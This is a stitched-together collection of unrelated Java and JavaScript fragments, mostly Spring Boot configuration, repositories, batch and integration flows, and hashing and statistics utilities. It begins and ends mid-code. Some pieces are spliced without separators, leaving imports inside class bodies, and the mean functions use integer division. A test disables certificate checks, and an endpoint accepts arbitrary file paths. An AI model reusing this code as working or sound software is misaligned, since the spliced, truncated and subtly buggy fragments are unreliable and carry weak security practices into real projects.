   * Receives a terminating error from the stream.
   *
   * <p>May only be called once and if called it must be the last method called. In particular if an
   * exception is thrown by an implementation of {@code onError} no further calls to any method are
   * allowed.
   *
   * <p>{@code t} should be a {@link io.grpc.StatusException} or {@link
   * io.grpc.StatusRuntimeException}, but other {@code Throwable} types are possible. Callers should
   * generally convert from a {@link io.grpc.Status} via {@link io.grpc.Status#asException()} or
   * {@link io.grpc.Status#asRuntimeException()}. Implementations should generally convert to a
   * {@code Status} via {@link io.grpc.Status#fromThrowable(Throwable)}.
   *
   * @param t the error occurred on the stream
   */
  void onError(Throwable t);

  /**
   * Receives a notification of successful stream completion.
   *
   * <p>May only be called once and if called it must be the last method called. In particular if an
   * exception is thrown by an implementation of {@code onCompleted} no further calls to any method
   * are allowed.
   */
  void onCompleted();
}
----------------------------------------------------------------------------------------
    @LastModifiedDate
    @Type(type = "org.jadira.usertype.dateandtime.joda.PersistentDateTime")
    @Column(name = "last_modified_date")
    @JsonIgnore
    private DateTime lastModifiedDate = DateTime.now();
----------------------------------------------------------------------------------------
	<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <fork>true</fork>
                    <mainClass>${start-class}</mainClass>
                    <jvmArguments>-Xms512m -Xmx1024m -Xdebug
                        -Xrunjdwp:server=y,transport=dt_socket,address=${debug.port},suspend=n
                        -Denv=${project.build.testOutputDirectory}/application</jvmArguments>

                </configuration>
			</plugin>
----------------------------------------------------------------------------------------
events {
  worker_connections  4096;  ## Default: 1024
}

http {
  server {
    listen 80;
    default_type application/octet-stream;

    location ~ ^/(api|oauth) {
      proxy_pass http://todo-rest:8080;
    }

    location / {
      gzip on;
      gzip_proxied any;
      gzip_buffers 16 8k;
      gzip_types text/plain application/javascript application/x-javascript text/javascript text/xml text/css;
      gzip_vary on;

      root   /usr/share/nginx/html;
      index  index.html index.htm;
      include /etc/nginx/mime.types;
    }

  }
}

  @Before
  public void init() throws KeyStoreException, NoSuchAlgorithmException, KeyManagementException {
    SSLContextBuilder builder = new SSLContextBuilder();
    // trust self signed certificate
    builder.loadTrustMaterial(null, new TrustSelfSignedStrategy());
    SSLConnectionSocketFactory sslConnectionSocketFactory = new SSLConnectionSocketFactory(
        builder.build());
    final HttpClient httpClient = HttpClients.custom().setSSLSocketFactory(
        sslConnectionSocketFactory).build();

    restTemplate = new TestRestTemplate();
    restTemplate.setRequestFactory(new HttpComponentsClientHttpRequestFactory(httpClient) {
      @Override
      protected HttpContext createHttpContext(HttpMethod httpMethod, URI uri) {
        HttpClientContext context = HttpClientContext.create();
        RequestConfig.Builder builder = RequestConfig.custom()
            .setCookieSpec(CookieSpecs.IGNORE_COOKIES)
            .setAuthenticationEnabled(false).setRedirectsEnabled(false)
            .setConnectTimeout(1000).setConnectionRequestTimeout(1000).setSocketTimeout(1000);
        context.setRequestConfig(builder.build());
        return context;
      }
    });
  }
----------------------------------------------------------------------------------------
import com.piggymetrics.notification.domain.Recipient;
import org.springframework.data.mongodb.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.stereotype.Repository;

import java.util.List;

@Repository
public interface RecipientRepository extends CrudRepository<Recipient, String> {

	Recipient findByAccountName(String name);

	@Query("{ $and: [ {scheduledNotifications.BACKUP.active: true }, { $where: 'this.scheduledNotifications.BACKUP.lastNotified < " +
			"new Date(new Date().setDate(new Date().getDate() - this.scheduledNotifications.BACKUP.frequency ))' }] }")
	List<Recipient> findReadyForBackup();

	@Query("{ $and: [ {scheduledNotifications.REMIND.active: true }, { $where: 'this.scheduledNotifications.REMIND.lastNotified < " +
			"new Date(new Date().setDate(new Date().getDate() - this.scheduledNotifications.REMIND.frequency ))' }] }")
	List<Recipient> findReadyForRemind();

}
----------------------------------------------------------------------------------------
    private SearchQuery getCitySearchQuery(Integer pageNumber, Integer pageSize,String searchContent) {
        // 短语匹配到的搜索词，求和模式累加权重分
        // 权重分查询 https://www.elastic.co/guide/cn/elasticsearch/guide/current/function-score-query.html
        //   - 短语匹配 https://www.elastic.co/guide/cn/elasticsearch/guide/current/phrase-matching.html
        //   - 字段对应权重分设置，可以优化成 enum
        //   - 由于无相关性的分值默认为 1 ，设置权重分最小值为 10
        FunctionScoreQueryBuilder functionScoreQueryBuilder = QueryBuilders.functionScoreQuery()
                .add(QueryBuilders.matchPhraseQuery("name", searchContent),
                ScoreFunctionBuilders.weightFactorFunction(1000))
                .add(QueryBuilders.matchPhraseQuery("description", searchContent),
                ScoreFunctionBuilders.weightFactorFunction(500))
                .scoreMode(SCORE_MODE_SUM).setMinScore(MIN_SCORE);

        // 分页参数
        Pageable pageable = new PageRequest(pageNumber, pageSize);
        return new NativeSearchQueryBuilder()
                .withPageable(pageable)
                .withQuery(functionScoreQueryBuilder).build();
    }
	
	import org.apache.ibatis.annotations.*;
import org.spring.springboot.domain.City;

/**
 * 城市 DAO 接口类
 *
 * Created by xchunzhao on 02/05/2017.
 */
@Mapper // 标志为 Mybatis 的 Mapper
public interface CityDao {

    /**
     * 根据城市名称，查询城市信息
     *
     * @param cityName 城市名
     */
    @Select("SELECT * FROM city")
    // 返回 Map 结果集
    @Results({
            @Result(property = "id", column = "id"),
            @Result(property = "provinceId", column = "province_id"),
            @Result(property = "cityName", column = "city_name"),
            @Result(property = "description", column = "description"),
    })
    City findByName(@Param("cityName") String cityName);
}

    @Bean(name = "validator")
    @ConditionalOnMissingBean(Validator.class)
    public Validator validator() {
        ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
        return factory.getValidator();
    }
----------------------------------------------------------------------------------------
    // disable page caching
        httpSecurity
                .headers()
                .frameOptions().sameOrigin()  // required to set for H2 else H2 Console will be blank.
                .cacheControl();
----------------------------------------------------------------------------------------
	@HystrixCommand(fallbackMethod = "getFallbackCommentsForTask", commandProperties = {
			@HystrixProperty(name = "execution.isolation.strategy", value = "SEMAPHORE"),
			@HystrixProperty(name = "circuitBreaker.requestVolumeThreshold", value = "10"),
			@HystrixProperty(name = "circuitBreaker.sleepWindowInMilliseconds", value = "1000") })
	public CommentCollectionResource getCommentsForTask(String taskId) {
		// Get the comments for this task
		return restTemplate.getForObject(String.format("http://comments-webservice/comments/%s", taskId),
				CommentCollectionResource.class);

	}
----------------------------------------------------------------------------------------
/**
 * Abstraction for hash code generation and equality comparison.
 */
public interface HashingStrategy<T> {
    /**
     * Generate a hash code for {@code obj}.
     * <p>
     * This method must obey the same relationship that {@link java.lang.Object#hashCode()} has with
     * {@link java.lang.Object#equals(Object)}:
     * <ul>
     * <li>Calling this method multiple times with the same {@code obj} should return the same result</li>
     * <li>If {@link #equals(Object, Object)} with parameters {@code a} and {@code b} returns {@code true}
     * then the return value for this method for parameters {@code a} and {@code b} must return the same result</li>
     * <li>If {@link #equals(Object, Object)} with parameters {@code a} and {@code b} returns {@code false}
     * then the return value for this method for parameters {@code a} and {@code b} does <strong>not</strong> have to
     * return different results results. However this property is desirable.</li>
     * <li>if {@code obj} is {@code null} then this method return {@code 0}</li>
     * </ul>
     */
    int hashCode(T obj);

    /**
     * Returns {@code true} if the arguments are equal to each other and {@code false} otherwise.
     * This method has the following restrictions:
     * <ul>
     * <li><i>reflexive</i> - {@code equals(a, a)} should return true</li>
     * <li><i>symmetric</i> - {@code equals(a, b)} returns {@code true} iff {@code equals(b, a)} returns
     * {@code true}</li>
     * <li><i>transitive</i> - if {@code equals(a, b)} returns {@code true} and {@code equals(a, c)} returns
     * {@code true} then {@code equals(b, c)} should also return {@code true}</li>
     * <li><i>consistent</i> - {@code equals(a, b)} should return the same result when called multiple times
     * assuming {@code a} and {@code b} remain unchanged relative to the comparison criteria</li>
     * <li>if {@code a} and {@code b} are both {@code null} then this method returns {@code true}</li>
     * <li>if {@code a} is {@code null} and {@code b} is non-{@code null}, or {@code a} is non-{@code null} and
     * {@code b} is {@code null} then this method returns {@code false}</li>
     * </ul>
     */
    boolean equals(T a, T b);

    /**
     * A {@link HashingStrategy} which delegates to java's {@link Object#hashCode()}
     * and {@link Object#equals(Object)}.
     */
    @SuppressWarnings("rawtypes")
    HashingStrategy JAVA_HASHER = new HashingStrategy() {
        @Override
        public int hashCode(Object obj) {
            return obj != null ? obj.hashCode() : 0;
        }

        @Override
        public boolean equals(Object a, Object b) {
            return (a == b) || (a != null && a.equals(b));
        }
    };
}
----------------------------------------------------------------------------------------
import org.apache.catalina.startup.Tomcat;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.context.annotation.Configuration;

@Configuration
@ConditionalOnClass(Tomcat.class)
@ConditionalOnProperty(name = "log-tomcat-version", matchIfMissing = true)
public class LogTomcatVersionAutoConfiguration {

	private static Log logger = LogFactory
			.getLog(LogTomcatVersionAutoConfiguration.class);

	@PostConstruct
	public void logTomcatVersion() {
		logger.info("\n\n\nTomcat v"
				+ Tomcat.class.getPackage().getImplementationVersion() + "\n\n");
	}

}

import org.springframework.context.annotation.Configuration;
import org.springframework.data.rest.core.config.RepositoryRestConfiguration;
import org.springframework.data.rest.webmvc.config.RepositoryRestMvcConfiguration;

@Configuration
public class SimpleRepositoryRestMvcConfiguration extends RepositoryRestMvcConfiguration {

	@Override
	protected void configureRepositoryRestConfiguration(
			RepositoryRestConfiguration config) {
		config.exposeIdsFor(Person.class);
	}

}

import org.springframework.hateoas.Link;
import org.springframework.hateoas.Resource;
import org.springframework.hateoas.ResourceProcessor;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.support.ServletUriComponentsBuilder;
import org.springframework.web.util.UriComponents;

@Component
public class PersonResourceProcessor implements ResourceProcessor<Resource<Person>> {

	@Override
	public Resource<Person> process(Resource<Person> resource) {
		String id = Long.toString(resource.getContent().getId());
		UriComponents uriComponents = ServletUriComponentsBuilder.fromCurrentContextPath()
				.path("/people/{id}/photo").buildAndExpand(id);
		String uri = uriComponents.toUriString();
		resource.add(new Link(uri, "photo"));
		return resource;
	}

}

import org.springframework.batch.core.Job;
import org.springframework.batch.core.JobExecution;
import org.springframework.batch.core.JobParametersBuilder;
import org.springframework.batch.core.Step;
import org.springframework.batch.core.configuration.annotation.EnableBatchProcessing;
import org.springframework.batch.core.configuration.annotation.JobBuilderFactory;
import org.springframework.batch.core.configuration.annotation.StepBuilderFactory;
import org.springframework.batch.core.configuration.annotation.StepScope;
import org.springframework.batch.core.launch.JobLauncher;
import org.springframework.batch.item.database.BeanPropertyItemSqlParameterSourceProvider;
import org.springframework.batch.item.database.JdbcBatchItemWriter;
import org.springframework.batch.item.file.FlatFileItemReader;
import org.springframework.batch.item.file.mapping.BeanWrapperFieldSetMapper;
import org.springframework.batch.item.file.mapping.DefaultLineMapper;
import org.springframework.batch.item.file.transform.DelimitedLineTokenizer;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.FileSystemResource;
import org.springframework.jdbc.core.JdbcTemplate;

import javax.sql.DataSource;
import java.io.File;
import java.util.List;

@Configuration
@EnableBatchProcessing
public class BatchConfiguration {

    @Bean
    @StepScope
    FlatFileItemReader<Person> flatFileItemReader(@Value("#{jobParameters[file]}") File file) {
        FlatFileItemReader<Person> r = new FlatFileItemReader<>();
        r.setResource(new FileSystemResource(file));
        r.setLineMapper(new DefaultLineMapper<Person>() {
            {
                this.setLineTokenizer(new DelimitedLineTokenizer(",") {
                    {
                        this.setNames(new String[]{"first", "last", "email"});
                    }
                });
                this.setFieldSetMapper(new BeanWrapperFieldSetMapper<Person>() {
                    {
                        this.setTargetType(Person.class);
                    }
                });
            }
        });
        return r;
    }

    @Bean
    JdbcBatchItemWriter<Person> jdbcBatchItemWriter(DataSource h2) {
        JdbcBatchItemWriter<Person> w = new JdbcBatchItemWriter<>();
        w.setDataSource(h2);
        w.setSql("insert into PEOPLE( first, last, email) values ( :first, :last, :email )");
        w.setItemSqlParameterSourceProvider(new BeanPropertyItemSqlParameterSourceProvider<>());
        return w;
    }

    @Bean
    Job personEtl(JobBuilderFactory jobBuilderFactory,
            StepBuilderFactory stepBuilderFactory,
            FlatFileItemReader<Person> reader,
            JdbcBatchItemWriter<Person> writer
    ) {

        Step step = stepBuilderFactory.get("file-to-database")
                .<Person, Person>chunk(5)
                .reader(reader)
                .writer(writer)
                .build();

        return jobBuilderFactory.get("etl")
                .start(step)
                .build();
    }

    //@Bean
    CommandLineRunner runner(JobLauncher launcher,
                             Job job,
                             @Value("${file}") File in,
                             JdbcTemplate jdbcTemplate) {
        return args -> {

            JobExecution execution = launcher.run(job,
                    new JobParametersBuilder()
                            .addString("file", in.getAbsolutePath())
                            .toJobParameters());

            System.out.println("execution status: " + execution.getExitStatus().toString());

            List<Person> personList = jdbcTemplate.query("select * from PEOPLE", (resultSet, i) -> new Person(resultSet.getString("first"),
                    resultSet.getString("last"),
                    resultSet.getString("email")));

            personList.forEach(System.out::println);

        };

    }

}

import org.springframework.batch.core.Job;
import org.springframework.batch.core.JobExecution;
import org.springframework.batch.core.JobParameters;
import org.springframework.batch.core.JobParametersBuilder;
import org.springframework.batch.core.launch.JobLauncher;
import org.springframework.batch.integration.launch.JobLaunchRequest;
import org.springframework.batch.integration.launch.JobLaunchingGateway;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.integration.dsl.IntegrationFlow;
import org.springframework.integration.dsl.IntegrationFlows;
import org.springframework.integration.dsl.channel.MessageChannels;
import org.springframework.integration.dsl.file.Files;
import org.springframework.integration.transformer.GenericTransformer;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageChannel;
import org.springframework.messaging.support.MessageBuilder;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.util.List;
import java.util.concurrent.TimeUnit;

@Configuration
public class IntegrationConfiguration {

    @Bean
    MessageChannel files() {
        return MessageChannels.direct().get();
    }

    @RestController
    public static class FileNameRestController {

        private final MessageChannel files;

        @RequestMapping(method = RequestMethod.GET, value = "/files")
        void triggerJobForFile(@RequestParam String file) {

            Message<File> fileMessage = MessageBuilder.withPayload(new File(file))
                    .build();
            this.files.send(fileMessage);
        }

        @Autowired
        public FileNameRestController(MessageChannel files) {
            this.files = files;
        }
    }

    @Bean
    IntegrationFlow batchJobFlow(Job job,
                                 JdbcTemplate jdbcTemplate,
                                 JobLauncher launcher,
                                 MessageChannel files) {

        return IntegrationFlows.from(files)
                .transform((GenericTransformer<Object,JobLaunchRequest>) file -> {
                    System.out.println(file.toString());
                    System.out.println(file.getClass());
                    return null ;
                })
                .transform((GenericTransformer<File, JobLaunchRequest>) file -> {
                    JobParameters jp = new JobParametersBuilder()
                            .addString("file", file.getAbsolutePath())
                            .toJobParameters();
                    return new JobLaunchRequest(job, jp);
                })
                .handle(new JobLaunchingGateway(launcher))
                .handle(JobExecution.class, (payload, headers) -> {
                    System.out.println("job execution status: " + payload.getExitStatus().toString());

                    List<Person> personList = jdbcTemplate.query("select * from PEOPLE",
                            (resultSet, i) -> new Person(resultSet.getString("first"),
                                    resultSet.getString("last"),
                                    resultSet.getString("email")));

                    personList.forEach(System.out::println);
                    return null;
                })
                .get();

    }

    @Bean
    IntegrationFlow incomingFiles(@Value("${HOME}/Desktop/in") File dir) {

        return IntegrationFlows.from(
                Files.inboundAdapter(dir)
                        .preventDuplicates()
                        .autoCreateDirectory(true),
                poller -> poller.poller(spec -> spec.fixedRate(1, TimeUnit.SECONDS)))
                .channel( this.files())
                .get();

    }
}

import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

import org.springframework.amqp.rabbit.core.RabbitMessagingTemplate;
import org.springframework.boot.CommandLineRunner;
import org.springframework.stereotype.Component;

@Component
public class Producer implements CommandLineRunner {

	private final RabbitMessagingTemplate messagingTemplate;

	public Producer(RabbitMessagingTemplate messagingTemplate) {
		this.messagingTemplate = messagingTemplate;
	}

	@Override
	public void run(String... args) throws Exception {
		Notification notification = new Notification(UUID.randomUUID().toString(),
				"Hello, world!", new Date());

		Map<String, Object> headers = new HashMap<>();
		headers.put("notification-id", notification.getId());

		this.messagingTemplate.convertAndSend(MessagingApplication.NOTIFICATIONS,
				notification, headers, message -> {
					System.out.println("sending " + message.getPayload().toString());
					return message;
				});
	}

}

import org.springframework.amqp.core.AmqpAdmin;
import org.springframework.amqp.core.Binding;
import org.springframework.amqp.core.BindingBuilder;
import org.springframework.amqp.core.DirectExchange;
import org.springframework.amqp.core.Queue;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;

@SpringBootApplication
public class MessagingApplication {

	public static final String NOTIFICATIONS = "notifications";

	@Bean
	public InitializingBean prepareQueues(AmqpAdmin amqpAdmin) {
		return () -> {
			Queue queue = new Queue(NOTIFICATIONS, true);
			DirectExchange exchange = new DirectExchange(NOTIFICATIONS);
			Binding binding = BindingBuilder.bind(queue).to(exchange).with(NOTIFICATIONS);
			amqpAdmin.declareQueue(queue);
			amqpAdmin.declareExchange(exchange);
			amqpAdmin.declareBinding(binding);

		};
	}

	public static void main(String[] args) {
		SpringApplication.run(MessagingApplication.class, args);
	}

}

import java.util.Collection;

import org.springframework.cloud.netflix.feign.FeignClient;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@FeignClient("contact-service")
public interface ContactClient {

	@RequestMapping(method = RequestMethod.GET, value = "/{userId}/contacts")
	Collection<Contact> getContacts(@PathVariable("userId") String userId);

}

import reactor.Environment;
import reactor.rx.Stream;
import reactor.rx.Streams;

import org.springframework.stereotype.Component;

@Component
public class PassportService {

	private final Environment environment;

	private final ContactClient contactClient;

	private final BookmarkClient bookmarkClient;

	public PassportService(Environment environment, ContactClient contactClient,
			BookmarkClient bookmarkClient) {
		this.environment = environment;
		this.contactClient = contactClient;
		this.bookmarkClient = bookmarkClient;
	}

	public Stream<Bookmark> getBookmarks(String userId) {
		return Streams.<Bookmark>create(subscriber -> {
			this.bookmarkClient.getBookmarks(userId).forEach(subscriber::onNext);
			subscriber.onComplete();
		}).dispatchOn(this.environment, Environment.cachedDispatcher()).log("bookmarks");
	}

	public Stream<Contact> getContacts(String userId) {
		return Streams.<Contact>create(subscriber -> {
			this.contactClient.getContacts(userId).forEach(subscriber::onNext);
			subscriber.onComplete();
		}).dispatchOn(this.environment, Environment.cachedDispatcher()).log("contacts");
	}

	public Stream<Passport> getPassport(String userId, Stream<Contact> contacts,
			Stream<Bookmark> bookmarks) {
		return Streams.zip(contacts.buffer(), bookmarks.buffer(),
				tuple -> new Passport(userId, tuple.getT1(), tuple.getT2()));
	}
}
----------------------------------------------------------------------------------------
var car = {};
Object.defineProperty(car, 'doors', {
 writable: true,
 configurable: true,
 enumerable: true,
 value: 4
});
Object.defineProperty(car, 'wheels', {
 writable: true,
 configurable: true,
 enumerable: true,
 value: 4
});
Object.defineProperty(car, 'secretTrackingDeviceEnabled', {
 enumerable: false,
 value: true
});
// => doors
// => wheels
for (var x in car) {
 console.log(x);
}

var box = Object.create({}, {
 openLid: {
 value: function () {
 return "nothing";
 },
 enumerable: true
 },
 openSecretCompartment: {
 value: function () {
 return 'treasure';
 },
 enumerable: false
 }
});

var Car = function (wheelCount) {
 this.odometer = 0;
 this.wheels = wheelCount || 4;
};
Car.prototype.drive = function (miles) {
 this.odometer += miles;
 return this.odometer;
};
var tesla = new Car();
// => true
console.log(Object.getPrototypeOf(tesla) === Car.prototype);
// => true
console.log(tesla.__proto__ === Car.prototype);

var dispatcher = {
 join: function (before, after) {
 return before + ':' + after
 },
 sum: function () {
 var args = Array.prototype.slice.call(arguments);
 return args.reduce(function (previousValue, currentValue, index, array) {
 return previousValue + currentValue;
 });
 }
};
var proxy = {
 relay: function (method) {
 var args;
 args = Array.prototype.splice.call(arguments, 1);
 return dispatcher[method].apply(dispatcher, args);
 }
};
// => bar:baz
console.log(proxy.relay('join', 'bar', 'baz'));
// => 28
console.log(proxy.relay('sum', 1, 2, 3, 4, 5, 6, 7));



var dispatcher = {
 join: function (before, after) {
 return before + ':' + after
 },
 sum: function () {
 var args = Array.prototype.slice.call(arguments);
 return args.reduce(function (previousValue, currentValue, index, array) {
 return previousValue + currentValue;
 });
 }
};
var proxy = {
 relay: function (method) {
 var args;
 args = Array.prototype.splice.call(arguments, 1);
 return dispatcher[method].apply(dispatcher, args);
 }
};
----------------------------------------------------------------------------------------
import androidx.annotation.Nullable;

/**
 * Utilities for generating 64-bit long IDs from types such as {@link CharSequence}.
 */
public final class IdUtils {
  private IdUtils() {
  }

  /**
   * Hash a long into 64 bits instead of the normal 32. This uses a xor shift implementation to
   * attempt psuedo randomness so object ids have an even spread for less chance of collisions.
   * <p>
   * From http://stackoverflow.com/a/11554034
   * <p>
   * http://www.javamex.com/tutorials/random_numbers/xorshift.shtml
   */
  public static long hashLong64Bit(long value) {
    value ^= (value << 21);
    value ^= (value >>> 35);
    value ^= (value << 4);
    return value;
  }

  /**
   * Hash a string into 64 bits instead of the normal 32. This allows us to better use strings as a
   * model id with less chance of collisions. This uses the FNV-1a algorithm for a good mix of speed
   * and distribution.
   * <p>
   * Performance comparisons found at http://stackoverflow.com/a/1660613
   * <p>
   * Hash implementation from http://www.isthe.com/chongo/tech/comp/fnv/index.html#FNV-1a
   */
  public static long hashString64Bit(@Nullable CharSequence str) {
    if (str == null) {
      return 0;
    }

    long result = 0xcbf29ce484222325L;
    final int len = str.length();
    for (int i = 0; i < len; i++) {
      result ^= str.charAt(i);
      result *= 0x100000001b3L;
    }
    return result;
  }
}
----------------------------------------------------------------------------------------
import io.netty.buffer.ByteBuf;
import lombok.extern.slf4j.Slf4j;

import java.nio.ByteOrder;

@Slf4j
public final class Murmur3 {
    private static final int C1 = 0xcc9e2d51;
    private static final int C2 = 0x1b873593;

    public static int hash32(ByteBuf data) {
        return hash32(data, data.readerIndex(), data.readableBytes(), 0);
    }

    public static int hash32(ByteBuf data, final int offset, final int length) {
        return hash32(data, offset, length, 0);
    }

    @SuppressWarnings("OverlyLongMethod")
    public static int hash32(ByteBuf data, final int offset, final int length, final int seed) {
        final ByteBuf ordered = data.order(ByteOrder.LITTLE_ENDIAN);

        int h = seed;

        final int len4 = length >>> 2;
        final int end4 = offset + (len4 << 2);

        for (int i = offset; i < end4; i += 4) {
            int k = ordered.getInt(i);

            k *= C1;
            k = k << 15 | k >>> 17;
            k *= C2;

            h ^= k;
            h = h << 13 | h >>> 19;
            h = h * 5 + 0xe6546b64;
        }

        int k = 0;
        switch (length & 3) {
            case 3:
                k = (ordered.getByte(end4 + 2) & 0xff) << 16;
            case 2:
                k |= (ordered.getByte(end4 + 1) & 0xff) << 8;
            case 1:
                k |= ordered.getByte(end4) & 0xff;

                k *= C1;
                k = (k << 15) | (k >>> 17);
                k *= C2;
                h ^= k;
        }

        h ^= length;
        h ^= h >>> 16;
        h *= 0x85ebca6b;
        h ^= h >>> 13;
        h *= 0xc2b2ae35;
        h ^= h >>> 16;

        return h;
    }
}
----------------------------------------------------------------------------------------
public class Staircase {

    // Complete the staircase function below.
    static void staircase(int n) {
        String str = "#";
        for (int i = 0; i < n; i++) {
            System.out.printf("%" + n + "s\n", str);
            str += "#";
        }
    }

    private static final Scanner scanner = new Scanner(System.in);

    public static void main(String[] args) {
        int n = scanner.nextInt();
        scanner.skip("(\r\n|[\n\r\u2028\u2029\u0085])?");

        staircase(n);

        scanner.close();
    }

}
----------------------------------------------------------------------------------------
import br.com.devmanfredi.engineering.dto.SquadDTO;
import br.com.devmanfredi.engineering.entity.Squad;
import org.mapstruct.Mapper;
import org.mapstruct.Mapping;
import org.mapstruct.Mappings;
import org.mapstruct.ReportingPolicy;

import java.util.List;

@Mapper(componentModel = "spring", unmappedTargetPolicy = ReportingPolicy.IGNORE)
public interface SquadMapper {
    @Mappings({
            @Mapping(source = "id", target = "id"),
            //@Mapping(source = "collaboratorName", target = "collaborators.fullName")
    })
    Squad map(SquadDTO squadDTO);

    List<Squad> map(List<SquadDTO> squadDTOS);

    SquadDTO toDTO(Squad squad);
}
import br.com.devmanfredi.engineering.dto.CollaboratorDTO;
import br.com.devmanfredi.engineering.entity.Collaborator;
import org.mapstruct.Mapper;
import org.mapstruct.Mapping;
import org.mapstruct.Mappings;
import org.mapstruct.ReportingPolicy;

import java.util.List;

@Mapper(componentModel = "spring", unmappedTargetPolicy = ReportingPolicy.IGNORE)
public interface CollaboratorMapper {

    @Mappings({
            @Mapping(source = "id", target = "id"),
            @Mapping(source = "squadId", target = "squad.id"),
            @Mapping(source = "email", target = "email"),
            @Mapping(source = "fullName", target = "fullName"),
            @Mapping(source = "nickName", target = "nickName"),
            @Mapping(source = "password", target = "password"),
            @Mapping(source = "salary", target = "salary"),
            @Mapping(source = "level", target = "level"),
            @Mapping(source = "office", target = "office")
    })
    Collaborator map(CollaboratorDTO collaboratorDTO);
    List<Collaborator> map(List<CollaboratorDTO> collaboratorDTOS);

    CollaboratorDTO toDTO(Collaborator collaborator);

    List<CollaboratorDTO> toListDTO(List<Collaborator> collaborators);
}

 @Modifying(clearAutomatically = true)
    @Transactional
    @Query("UPDATE Log a SET a.toFile = true WHERE a.id =:id")
    void toFile(@Param("id") Long id);
	
	String db = "jdbc:hsqldb:hsql://localhost:" + String.valueOf(port) + "/xdb";
----------------------------------------------------------------------------------------
import com.intellij.psi.util.PsiUtil;
import lombok.experimental.UtilityClass;

/**
 * Created by 1 on 12.05.2018.
 */
@UtilityClass
public class LombokAnnotationsUtils {
    private static final String LOMBOK_PROTECTED_ACCESS = "lombok.AccessLevel.PROTECTED";
    private static final String LOMBOK_PUBLIC_ACCESS = "";
    private static final String LOMBOK_PRIVATE_ACCESS = "lombok.AccessLevel.PRIVATE";
    private static final String LOMBOK_PACKAGE_ACCESS = "lombok.AccessLevel.PACKAGE";

    public static final String LOMBOK_GETTER = "lombok.Getter";
    public static final String LOMBOK_NO_ARGS_CONSTRUCTOR = "lombok.NoArgsConstructor";
    private static final String LOMBOK_SETTER = "lombok.Setter";


    private static String createSingleAttribute(String attribute) {
        return "(" + attribute + ")";
    }

    private static String getSimpleAccessAttribute(int accessLevel) {
        switch (accessLevel) {
            case PsiUtil.ACCESS_LEVEL_PRIVATE:
                return createSingleAttribute(LOMBOK_PRIVATE_ACCESS);
            case PsiUtil.ACCESS_LEVEL_PACKAGE_LOCAL:
                return createSingleAttribute(LOMBOK_PACKAGE_ACCESS);
            case PsiUtil.ACCESS_LEVEL_PROTECTED:
                return createSingleAttribute(LOMBOK_PROTECTED_ACCESS);
            default:
                return LOMBOK_PUBLIC_ACCESS;
        }
    }

    public static String getGetterAnnotation(int accessLevel) {
        return LOMBOK_GETTER + getSimpleAccessAttribute(accessLevel);
    }

    public static String getSetterAnnotation(int accessLevel) {
        return LOMBOK_SETTER + getSimpleAccessAttribute(accessLevel);
    }

    public static String getNoArgConstructorAnnotation(int accessLevel) {
        return LOMBOK_NO_ARGS_CONSTRUCTOR + getAccessAttribute(accessLevel);
    }

    private static String getAccessAttribute(int accessLevel) {

        switch (accessLevel) {
            case PsiUtil.ACCESS_LEVEL_PRIVATE:
                return "(access = " + LOMBOK_PRIVATE_ACCESS + ")";
            case PsiUtil.ACCESS_LEVEL_PACKAGE_LOCAL:
                return "(access = " + LOMBOK_PACKAGE_ACCESS + ")";
            case PsiUtil.ACCESS_LEVEL_PROTECTED:
                return "(access = " + LOMBOK_PROTECTED_ACCESS + ")";
            default:
                return LOMBOK_PUBLIC_ACCESS;
        }
    }
}
----------------------------------------------------------------------------------------
import java.util.Arrays;

/**
 * <br/>
 * <p/>
 * <p/>
 *
 * @author Charles Prud'homme
 * @since 17 aug 2010
 */
public class StatisticUtils {

    protected StatisticUtils() {
    }

    public static int sum(int... values) {
        int sum = 0;
        for (int i = 0; i < values.length; i++) {
            sum += values[i];
        }
        return sum;
    }

    public static long sum(long... values) {
        long sum = 0L;
        for (int i = 0; i < values.length; i++) {
            sum += values[i];
        }
        return sum;
    }

    public static float sum(float... values) {
        float sum = 0.0f;
        for (int i = 0; i < values.length; i++) {
            sum += values[i];
        }
        return sum;
    }

    public static double sum(double... values) {
        double sum = 0.0;
        for (int i = 0; i < values.length; i++) {
            sum += values[i];
        }
        return sum;
    }

    public static double mean(int... values) {
        return sum(values) / values.length;
    }

    public static float mean(long... values) {
        return sum(values) / values.length;
    }

    public static double mean(float... values) {
        return sum(values) / values.length;
    }

    public static double mean(double... values) {
        return sum(values) / values.length;
    }


    public static double standarddeviation(int... values) {
        double mean = mean(values);
        double[] psd = new double[values.length];
        for (int i = 0; i < values.length; i++) {
            psd[i] = Math.pow(values[i] - mean, 2.0);
        }
        return Math.sqrt(mean(psd));
    }

    public static double standarddeviation(long... values) {
        double mean = mean(values);
        double[] psd = new double[values.length];
        for (int i = 0; i < values.length; i++) {
            psd[i] = Math.pow(values[i] - mean, 2.0);
        }
        return Math.sqrt(mean(psd));
    }

    public static float standarddeviation(float... values) {
        double mean = mean(values);
        double[] psd = new double[values.length];
        for (int i = 0; i < values.length; i++) {
            psd[i] = Math.pow(values[i] - mean, 2.0);
        }
        return (float) Math.sqrt(mean(psd));
    }

    public static int[] prepare(int... values) {
        Arrays.sort(values);
        int[] back = new int[values.length - 2];
